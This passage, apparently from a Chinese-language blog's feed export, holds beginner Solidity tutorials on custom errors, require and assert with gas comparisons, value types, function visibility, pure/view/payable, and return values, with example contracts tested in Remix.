plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// Gas cost在Remix中测试得到 使用0.8.26版本编译</span><br><span class="line">// 参数使用 tokenId = 123, address = &#123;any address&#125;</span><br><span class="line"></span><br><span class="line">// 自定义error</span><br><span class="line">//error TransferNotOwner();</span><br><span class="line"></span><br><span class="line">error TransferNotOwner(address sender);</span><br><span class="line"></span><br><span class="line">contract Errors &#123;</span><br><span class="line">    // 一组映射，记录每个TokenId的Owner</span><br><span class="line">    mapping(uint256 =&gt; address) private _owners;</span><br><span class="line"></span><br><span class="line">    // Error方法: gas cost 24095</span><br><span class="line">    // Error方法: gas cost 24113</span><br><span class="line">    function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        if (_owners[tokenId] != msg.sender) &#123;</span><br><span class="line">            //revert TransferNotOwner();</span><br><span class="line">            revert TransferNotOwner(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // require方法: gas cost 24211</span><br><span class="line">    function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // assert方法: gas cost 24109</span><br><span class="line">    function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        assert(_owners[tokenId] == msg.sender);</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Error">Error</h3><p><code>error</code>是<code>solidity 0.8.4版本</code>新加的内容，方便且高效（省<code>gas</code>）地向用户解释操作失败的原因，同时还可以在抛出异常的同时携带参数，帮助开发者更好地调试。人们可以在<code>contract</code>之外定义异常。下面，我们定义一个<code>TransferNotOwner</code>异常，当用户不是代币<code>owner</code>的时候尝试转账，会抛出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); // 自定义error</span><br></pre></td></tr></table></figure><p>我们也可以定义一个携带参数的异常，来提示尝试转账的账户地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(address sender); // 自定义的带参数的error</span><br></pre></td></tr></table></figure><p>在执行当中，<code>error</code>必须搭配<code>revert</code>（回退）命令使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    if(_owners[tokenId] != msg.sender)&#123;</span><br><span class="line">        revert TransferNotOwner();</span><br><span class="line">        // revert TransferNotOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>transferOwner1()</code>函数，它会检查代币的<code>owner</code>是不是发起人，如果不是，就会抛出<code>TransferNotOwner</code>异常；如果是的话，就会转账。</p><p>不带参数的<code>error</code>，消耗<code>gas</code>量为<code>24095</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127123837474.png" alt="image-20250127123837474"></p><p>带参数的<code>error</code>，消耗<code>gas</code>量为<code>24113</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127124300009.png" alt="image-20250127124300009"></p><h3 id="Require">Require</h3><p><code>require</code>命令是<code>solidity 0.8版本</code>之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是<code>gas</code>随着描述异常的字符串长度增加，比<code>error</code>命令要高。使用方法：<code>require(检查条件，&quot;异常的描述&quot;)</code>，<strong>当检查条件不成立的时候，就会抛出异常。</strong></p><p>我们用<code>require</code>命令重写一下上面的<code>transferOwner1</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>require</code>消耗<code>gas</code>的量为<code>24211</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127125601300.png" alt="image-20250127125601300"></p><h3 id="Assert">Assert</h3><p><code>assert</code>命令一般用于程序员写程序<code>debug</code>，因为它不能解释抛出异常的原因（比<code>require</code>少个字符串）。它的用法很简单，<code>assert(检查条件）</code>，<strong>当检查条件不成立的时候，就会抛出异常。</strong></p><p>我们用<code>assert</code>命令重写一下上面的<code>transferOwner1</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    assert(_owners[tokenId] == msg.sender);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>assert</code>消耗<code>gas</code>的量为<code>24109</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127130047597.png" alt="image-20250127130047597"></p><h3 id="三种方法的gas比较">三种方法的gas比较</h3><p>我们比较一下三种抛出异常的<code>gas</code>消耗，查询<code>gas</code>的消耗 （使用0.8.26版本编译）</p><ol><li><code>error</code>方法<code>gas</code>消耗：24095 (加入参数后<code>gas</code>消耗：24113)</li><li><code>require</code>方法<code>gas</code>消耗：24211</li><li><code>assert</code>方法<code>gas</code>消耗：24109</li></ol><p>我们可以看到，<code>error</code>方法<code>gas</code>最少，其次是<code>assert</code>，<code>require</code>方法消耗<code>gas</code>最多！因此，<code>error</code>既可以告知用户抛出异常的原因，又能省<code>gas</code>，大家要多用！（注意，由于部署测试时间的不同，每个函数的<code>gas</code>消耗会有所不同，但是比较结果会是一致的。）</p><p><strong>备注:</strong> Solidity 0.8.0之前的版本，<code>assert</code>抛出的是一个 <code>panic exception</code>，会把剩余的 <code>gas</code> 全部消耗，不会返还。更多细节见<a href="https://docs.soliditylang.org/en/v0.8.17/control-structures.html">官方文档</a>。</p><h2 id="参考">参考</h2><p><a href="https://www.wtf.academy/docs/solidity-101/HelloWeb3">https://www.wtf.academy/docs/solidity-101/HelloWeb3</a></p><p><a href="https://github.com/AmazingAng/WTF-Solidity">https://github.com/AmazingAng/WTF-Solidity</a></p><p><a href="https://learnblockchain.cn/docs/ethers.js/api.html">https://learnblockchain.cn/docs/ethers.js/api.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity入门学习(一)</title>
      <link href="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
      <url>/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-Web3">Hello Web3</h2><h3 id="Solidity简介">Solidity简介</h3><p><code>Solidity</code>是一种用于编写以太坊虚拟机(<code>EVM</code>)智能合约的编程语言。</p><h3 id="Hello-Web3-2">Hello Web3</h3><p>简单的程序<code>HelloWeb3.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract HelloWeb3&#123;</span><br><span class="line">    string public _string = &quot;Hello Web3!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用到<a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>进行编译和部署，点击<code>_string</code>输出。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122224953662.png" alt="image-20250122224953662"></p><p>代码中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.21;</span><br></pre></td></tr></table></figure><p>表示源文件将不允许小于 0.8.21 版本或大于等于 0.9.0 的编译器编译（第二个条件由 <code>^</code> 提供）。</p><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public _string = &quot;Hello Web3!&quot;;</span><br></pre></td></tr></table></figure><p><code>public</code> 修饰符表示 <code>_string</code> 变量是公开的，任何人都可以读取该变量的值。</p><p>Solidity 会自动为 <code>public</code> 修饰的状态变量生成一个 getter 函数，允许外部代码（如其他合约或外部用户）通过合约的 ABI（应用二进制接口）访问这个变量的值。</p><h2 id="值类型">值类型</h2><h3 id="Solidity中的变量类型">Solidity中的变量类型</h3><ol><li><strong>值类型(Value Type)</strong>：包括布尔型、整数型等等，这类变量赋值时候直接传递数值。</li><li><strong>引用类型(Reference Type)</strong>：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。</li><li><strong>映射类型(Mapping Type)</strong>：Solidity中存储键值对的数据结构，可以理解为哈希表。</li></ol><p>编写一个简单的程序<code>ValueTypes.sol</code>，介绍一下各种变量类型，程序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract ValueTypes&#123;</span><br><span class="line">    // 布尔值</span><br><span class="line">    bool public _bool = true;</span><br><span class="line">    // 布尔运算</span><br><span class="line">    bool public _bool1 = !_bool; //取非</span><br><span class="line">    bool public _bool2 = _bool &amp;&amp; _bool1; //与</span><br><span class="line">    bool public _bool3 = _bool || _bool2; //或</span><br><span class="line">    bool public _bool4 = _bool == _bool; //相等</span><br><span class="line">    bool public _bool5 = _bool != _bool1; //不想等</span><br><span class="line">    // 整数</span><br><span class="line">    int public _int = -1;</span><br><span class="line">    uint public _uint = 1;</span><br><span class="line">    uint256 public _number = 20250122;</span><br><span class="line">    // 整数运算</span><br><span class="line">    uint256 public _number1 = _number + 1; // +，-，*，/</span><br><span class="line">    uint256 public _number2 = 2**2; // 指数</span><br><span class="line">    uint256 public _number3 = 7 % 2; // 取余数</span><br><span class="line">    bool public _numberbool = _number2 &gt; _number3; // 比大小</span><br><span class="line">    // 地址</span><br><span class="line">    address public _address = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;</span><br><span class="line">    address payable public _address1 = payable(_address); // payable address，可以转账、查余额</span><br><span class="line">    // 地址类型的成员</span><br><span class="line">    uint256 public balance = _address1.balance; // balance of address</span><br><span class="line">    // 固定长度的字节数组</span><br><span class="line">    bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">    bytes1 public _byte = _byte32[0];</span><br><span class="line"></span><br><span class="line">    // 用enum将uint 0， 1， 2表示为Buy, Hold, Sell</span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">    // 创建enum变量 action</span><br><span class="line">    //ActionSet action = ActionSet.Buy;</span><br><span class="line">    ActionSet action = ActionSet.Buy;</span><br><span class="line">    // enum可以和uint显式的转换</span><br><span class="line">    function enumToUint() external view returns(uint)&#123;</span><br><span class="line">        return uint(action);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="地址类型">地址类型</h3><p>地址类型(address)有两类：</p><ul><li>普通地址（address）: 存储一个 20 字节的值（以太坊地址的大小）。</li><li>payable address: 比普通地址多了 <code>transfer</code> 和 <code>send</code> 两个成员方法，用于接收转账。</li></ul><h3 id="定长字节数组">定长字节数组</h3><p>字节数组分为定长和不定长两种：</p><ul><li>定长字节数组: 属于值类型，数组长度在声明之后不能改变。根据字节数组的长度分为 <code>bytes1</code>, <code>bytes8</code>, <code>bytes32</code> 等类型。定长字节数组最多存储 32 bytes 数据，即<code>bytes32</code>。</li><li>不定长字节数组: 属于引用类型，数组长度在声明之后可以改变，包括 <code>bytes</code> 等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度的字节数组</span><br><span class="line">bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">bytes1 public _byte = _byte32[0]; </span><br></pre></td></tr></table></figure><p>在上述代码中，<code>MiniSolidity</code> 变量以字节的方式存储进变量 <code>_byte32</code>。如果把它转换成 <code>16 进制</code>，就是：<code>0x4d696e69536f6c69646974790000000000000000000000000000000000000000</code></p><p><code>_byte</code> 变量的值为 <code>_byte32</code> 的第一个字节，即 <code>0x4d</code>。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122234241902.png" alt="image-20250122234241902"></p><h3 id="枚举enum">枚举enum</h3><p>枚举（<code>enum</code>）是 Solidity 中用户定义的数据类型。它主要用于为 <code>uint</code> 分配名称，使程序易于阅读和维护。它与 <code>C 语言</code> 中的 <code>enum</code> 类似，使用名称来代替从 <code>0</code> 开始的 <code>uint</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 用enum将uint 0， 1， 2表示为Buy, Hold, Sell</span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">// 创建enum变量 action</span><br><span class="line">ActionSet action = ActionSet.Buy;</span><br></pre></td></tr></table></figure><p>枚举可以显式地和 <code>uint</code> 相互转换，并会检查转换的正整数是否在枚举的长度内，否则会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// enum可以和uint显式的转换</span><br><span class="line">function enumToUint() external view returns(uint)&#123;</span><br><span class="line">    return uint(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>enum</code> 是一个比较冷门的变量，几乎没什么人用。</p><p><code>enum</code>和<code>uint</code>相互转换，如下：</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122234959766.png" alt="image-20250122234959766"></p><h2 id="函数和函数输出">函数和函数输出</h2><h3 id="函数">函数</h3><h4 id="函数的代码形式">函数的代码形式</h4><p>Solidity 中函数的形式(方括号中的是可写可不 写的关键字)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function &lt;function name&gt;(&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)]</span><br></pre></td></tr></table></figure><ol><li><p><code>function</code>：声明函数时的固定用法。要编写函数，就需要以 <code>function</code> 关键字开头。</p></li><li><p><code>&lt;function name&gt;</code>：函数名。</p></li><li><p><code>(&lt;parameter types&gt;)</code>：圆括号内写入函数的参数，即输入到函数的变量类型和名称。</p></li><li><p><code>&#123;internal|external|public|private&#125;</code>：函数可见性说明符，共有4种。</p><ul><li><p><code>public</code>：内部和外部均可见。</p></li><li><p><code>private</code>：只能从本合约内部访问，继承的合约也不能使用。</p></li><li><p><code>external</code>：只能从合约外部访问（但内部可以通过 <code>this.f()</code> 来调用，<code>f</code>是函数名）。</p></li><li><p><code>internal</code>: 只能从合约内部访问，继承的合约可以用。</p></li></ul><p><strong>注意1⚠️</strong>：合约中定义的函数需要明确指定可见性，它们没有默认值。</p><p><strong>注意2</strong>⚠️：<code>public|private|internal</code> 也可用于修饰状态变量。<code>public</code>变量会自动生成同名的<code>getter</code>函数，用于查询数值。未标明可见性类型的状态变量，默认为<code>internal</code>。</p></li><li><p><code>[pure|view|payable]</code>：决定函数权限/功能的关键字。<code>payable</code>（可支付的）很好理解，带着它的函数，运行的时候可以给合约转入 ETH。</p></li><li><p><code>[returns (&lt;return types&gt;)]</code>：函数返回的变量类型和名称。</p></li></ol><h4 id="到底什么是Pure和View？">到底什么是<code>Pure</code>和<code>View</code>？</h4><p><code>solidity</code> 引入这两个关键字主要是因为 以太坊交易需要支付gas fee。合约的状态变量存储在链上，gas fee 很贵，如果计算不改变链上状态，就可以不用付 <code>gas</code>。包含 <code>pure</code> 和 <code>view</code> 关键字的函数是不改写链上状态的，因此用户直接调用它们是不需要付 gas 的（注意⚠️，合约中非 <code>pure</code>/<code>view</code> 函数调用 <code>pure</code>/<code>view</code> 函数时需要付gas）。</p><p>在以太坊中，以下语句被视为修改链上状态：</p><ol><li>写入状态变量。</li><li>释放事件。</li><li>创建其他合约。</li><li>使用 <code>selfdestruct</code>.</li><li>通过调用发送以太币。</li><li>调用任何未标记 <code>view</code> 或 <code>pure</code> 的函数。</li><li>使用低级调用（low-level calls）。</li><li>使用包含某些操作码的内联汇编。</li></ol><ul><li><code>pure</code>函数既不能读取也不能写入链上的状态变量。</li><li><code>view</code>函数能读取但不能写入状态变量。</li><li>非<code>pure</code>或<code>view</code>的函数既可以读取也可以写入状态变量。</li></ul><h4 id="代码测试">代码测试</h4><p>测试代码<code>FunctionTypes.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract FunctionTypes&#123;</span><br><span class="line">    uint256 public number = 5;</span><br><span class="line">    // 默认function</span><br><span class="line">    function add() external&#123;</span><br><span class="line">        number = number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // 验证pure和view</span><br><span class="line">    // function addtest() external view&#123;</span><br><span class="line">    //     number = number + 1;</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // pure</span><br><span class="line">    function addPure(uint256 _number) external pure returns(uint256 new_number)&#123;</span><br><span class="line">        new_number = _number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // view</span><br><span class="line">    function addView() external view returns(uint256 new_number) &#123;</span><br><span class="line">        new_number = number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // internal: 内部函数</span><br><span class="line">    function minus() internal &#123;</span><br><span class="line">        number = number - 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // 合约内的函数可以调用内部函数</span><br><span class="line">    function minusCall() external &#123;</span><br><span class="line">        minus();</span><br><span class="line">    &#125;</span><br><span class="line">    // payable: 递钱，能给合约支付eth的函数</span><br><span class="line">    function minusPayable() external payable returns(uint256 balance) &#123;</span><br><span class="line">        minus();    </span><br><span class="line">        balance = address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pure和view">pure和view</h5><p>在代码中定义了一个<code>add()</code>函数，每次调用会使得<code>number</code>加1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 默认function</span><br><span class="line">function add() external&#123;</span><br><span class="line">    number = number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>add()</code> 函数被标记为 <code>pure</code>，比如 <code>function add() external pure</code>，就会报错。因为 <code>pure</code> 是不能读取合约里的状态变量的，更不能改写。</p><p>使用到了<code>pure</code>出现的报错，如下：</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123030906176.png" alt="image-20250123030906176"></p><p>如果使用<code>view</code>，则代码会报错，证实了<code>view</code>是只能读取而不能写入状态变量。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123031819323.png" alt="image-20250123031819323"></p><p>那 <code>pure</code> 函数能做些什么？举个例子，你可以给函数传递一个参数 <code>_number</code>，然后让他返回 <code>_number + 1</code>，这个操作不会读取或写入状态变量。</p><p>如代码中的<code>addPure</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// pure</span><br><span class="line">function addPure(uint256 _number) external pure returns(uint256 new_number)&#123;</span><br><span class="line">    new_number = _number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123031506521.png" alt="image-20250123031506521"></p><p><code>view</code>读取状态变量，然后对读取的结果进行加1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// view</span><br><span class="line">function addView() external view returns(uint256 new_number) &#123;</span><br><span class="line">    new_number = number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123032230889.png" alt="image-20250123032230889"></p><h5 id="internal和external的对比">internal和external的对比</h5><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// internal: 内部函数</span><br><span class="line">function minus() internal &#123;</span><br><span class="line">    number = number - 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 合约内的函数可以调用内部函数</span><br><span class="line">function minusCall() external &#123;</span><br><span class="line">    minus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了一个 <code>internal</code> 的 <code>minus()</code> 函数，每次调用使得 <code>number</code> 变量减少 1。由于 <code>internal</code> 函数只能由合约内部调用，我们必须再定义一个 <code>external</code> 的 <code>minusCall()</code> 函数，外部通过它间接调用内部的 <code>minus()</code> 函数。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123033818196.png" alt="image-20250123033818196"></p><h5 id="payable的使用">payable的使用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// payable: 递钱，能给合约支付eth的函数</span><br><span class="line">function minusPayable() external payable returns(uint256 balance) &#123;</span><br><span class="line">    minus();    </span><br><span class="line">    balance = address(this).balance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个 <code>external payable</code> 的 <code>minusPayable()</code> 函数，间接的调用 <code>minus()</code>，并且返回合约里的 ETH 余额（<code>this</code> 关键字可以让我们引用合约地址）。我们可以在调用 <code>minusPayable()</code> 时往合约里转入1个 ETH。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123034641393.png" alt="image-20250123034641393"></p><h3 id="函数输出">函数输出</h3><p>测试代码<code>Return.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Return&#123;</span><br><span class="line">    // 返回多个变量</span><br><span class="line">    function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">        return(1, true, [uint256(1),2,5]);</span><br><span class="line">    &#125;</span><br><span class="line">    // 命名式返回</span><br><span class="line">    function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">        _number = 2;</span><br><span class="line">        _bool = false;</span><br><span class="line">        _array = [uint256(3),2,1];</span><br><span class="line">    &#125;</span><br><span class="line">    // 命名式返回，依然支持return</span><br><span class="line">    function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">        return(1, true, [uint256(1),2,5]);</span><br><span class="line">    &#125;</span><br><span class="line">    //读取返回值，解构式赋值</span><br><span class="line">    function readReturn() public pure&#123;</span><br><span class="line">        //读取全部返回值</span><br><span class="line">        uint256 _number;</span><br><span class="line">        bool _bool;</span><br><span class="line">        bool _bool2;</span><br><span class="line">        uint256[3] memory _array;</span><br><span class="line">        (_number, _bool, _array) = returnNamed();</span><br><span class="line"></span><br><span class="line">        //读取部分返回值</span><br><span class="line">        (,_bool2,) = returnNamed();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="返回值：return和returns">返回值：return和returns</h4><ul><li><code>returns</code>: 跟在函数名后面，用于声明返回的变量类型及变量名。</li><li><code>return</code>: 用于函数主体中，返回指定的变量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 返回多个变量</span><br><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span 